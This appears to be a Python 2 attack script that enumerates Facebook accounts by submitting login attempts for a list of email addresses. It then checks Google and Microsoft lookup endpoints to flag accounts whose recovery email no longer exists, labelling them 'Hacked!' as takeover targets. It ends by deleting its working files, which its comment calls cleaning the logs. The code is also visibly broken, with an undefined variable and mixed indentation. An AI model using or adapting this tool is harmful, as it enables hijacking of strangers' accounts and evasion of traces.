# -*- coding: utf-8 -*-
import os
import sys
import urllib2, urllib
import cookielib
import re
import time
import json
import requests
def home():
	logo = ""
	logo +="							\n"
	logo +='       d8888                                            \n'
	logo +='      d88888                                            \n'
	logo +='     d88P888                                            \n'
	logo +='    d88P 888 888d888 8888b.   .d88b.   .d88b.   .d88b.  \n'
	logo +='   d88P  888 888P"      "88b d88P"88b d88""88b d88P"88b \n'
	logo +='  d88P   888 888    .d888888 888  888 888  888 888  888 \n'
	logo +=' d8888888888 888    888  888 Y88b 888 Y88..88P Y88b 888 \n'
        logo +='d88P     888 888    "Y888888  "Y88888  "Y88P"   "Y88888 \n'
	logo +='                                  888               888 \n'
	logo +='                             Y8b d88P          Y8b d88P \n'
	logo +='                              "Y88P"            "Y88P"  \n'
	logo +='     Made by florianx00 - Kosovo                        \n'
	print logo
	separator()
def separator():
	# Check for each email that has Hotmail / Gmail
	# Separates them in two files based on email service
	filename = raw_input("EmailFile:/> ")
	file = open(filename, "r")
	for mails in file:
		if mails.endswith("gmail.com") :
			sys.stdout = open('gmail.txt','a')
                        sys.stdout.write(mails)
                        sys.stdout.close()
                        sys.stdout = sys.__stdout__
		elif name.endswith("hotmail.com") :
			sys.stdout = open('hotmail.txt','a')
                        sys.stdout.write(mails)
                        sys.stdout.close()
                        sys.stdout = sys.__stdout__
		else:
			pass
	filter()
def gmail():
	#time.sleep(1)
	# Check for Gmail accounts that Exists/Not
	# If email not valid that means that the account is vulnerable
	weblist = "gmailfb.txt"
        weblist = open(weblist)
        for i in weblist.readlines():
                link = i.strip("\n")
		try:
			link1 = link
			payload = {'continue': 'https://accounts.google.com/ManageAccount', 'f.req': '["%s","AEThLlxxiVGkhcsiEM9w_wb5MrQfQMX1jQpxGBevjgPIbUtF-byVilcvUSOwiIe5rmZj82Jv0MyJ_RJrxs4aQpX38ikbGqih0ic3_ketV0QWbMJKNiEWTrz7mWlspwWUPkrDXl52ZBfIIkOyPci85JYIAWU0ZskJmhg6HkbJakq5NEjjNf6IH6b7aARMDCsKojBZtHUMZ2FYLDBHX3_qiSP8HSsVBCbYdtadAOlsqOW_6m_4IOcRkPwGtULmq_Bdrm_KANaWAFvTT7F7R75zMtse5OrgNpb9vSSFVcVp0RPv5QskfuiZBFBfOVboB-LJph8CnrcBYGGrLqdqCE4irh1xrIr6IRy-9w",[],null,"XK",null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin",null,[],4],1,[null,null,[]],null,null,null,true],"%s"]' % (link, link1)}
			headers = {'Google-Accounts-XSRF': '1'}
			r = requests.post("https://accounts.google.com/_/signin/sl/lookup?hl=en&_reqid=344523&rt=j", data=payload, headers=headers)
			a = (r.text)
			try:
			        if link in a:
			                print "Not Hacked! " + link
			        else:
			                print "Hacked! " + link
			except:
			        raise
		except:
			raise
def hotmail():
	#time.sleep(1)
	# Check for Hotmail accounts that Exists/Not
        # If email not valid that means that the account is vulnerable
	weblist = "hotmailfb.txt"
        weblist = open(weblist)
        for i in weblist.readlines():
                link = i.strip("\n")
		try:
			url = "https://login.live.com/GetCredentialType.srf?vv=1600&mkt=EN-US&lc=1033"
			data = {'username': link, 'uaid': '8ab60b8743e1474798f62161f540faef'}
			headers = {'Content-type': 'application/json', 'Accept': 'text/plain', 'Cookie': '8ab60b8743e1474798f62161f540faef'}
			r = requests.post(url, data=json.dumps(data), headers=headers)
			try:
				for line in r:
					if '"IfExistsResult":1' in line:
						print "Hacked! " + link
					elif '"IfExistsResult":0' in line:
						print "Not Hacked! " + link
			except:
				raise
		except:
			raise
def filter():
	# Checks if hotmail.txt & gmail.txt have existing accounts
	# Seperates them to hotmailfb.txt & gmailfb.txt
	# Calls the function attacker
        useProxy = 0
        mode = 1
        signal = 'type="password"'
        countAcc = 0
        result = ""
        agent = 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0'
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        if useProxy == 0:
                opener = urllib2.build_opener(cookieHandler)
        else:
                opener = urllib2.build_opener(proxyHandler,cookieHandler)
                opener.addheaders = [('User-agent', agent)]
                cookieJar.clear()
                cookieJar.clear_session_cookies()
        print ""
        cms = "https://m.facebook.com/login.php"
        wordlist = "emails.txt"
        response = opener.open(cms)
        content = response.read()
        password = "test"
        wordlist = open(wordlist)
        for i in wordlist.readlines():
                email = i.strip("\n")
                try:
                        values = {'email' : email,
                        'pass' : password,}
                        data = urllib.urlencode(values)
                        response = opener.open(cms, data)
                        strTmp = response.read()
                        if "Emaili që fute nuk përputhet me asnjë llogari." in strTmp:
                                pass
                        elif "The email you’ve entered doesn’t match any account." in strTmp:
                                pass
                        elif strTmp.find(signal) < 0:
                                countAcc += 1
                                print result
                        else:
                                if "gmail" in email:
                                        sys.stdout = open('gmailfb.txt','a')
                                        sys.stdout.write(email + "\n")
                                        sys.stdout.close()
                                        sys.stdout = sys.__stdout__
                                elif "hotmail" in email:
                                        sys.stdout = open('hotmailfb.txt','a')
                                        sys.stdout.write(email + "\n")
                                        sys.stdout.close()
                                        sys.stdout = sys.__stdout__
                                else:
                                        pass
                                #time.sleep(2.5)
                except:
			raise
	attacker()
def attacker():
	# Calls two functions that will check if the facebook accounts have valid email
	# Cleans the logs
	gmail()
	hotmail()
	os.system("rm -rf gmailfb.txt hotmailfb.txt hotmail.txt gmail.txt")
home()
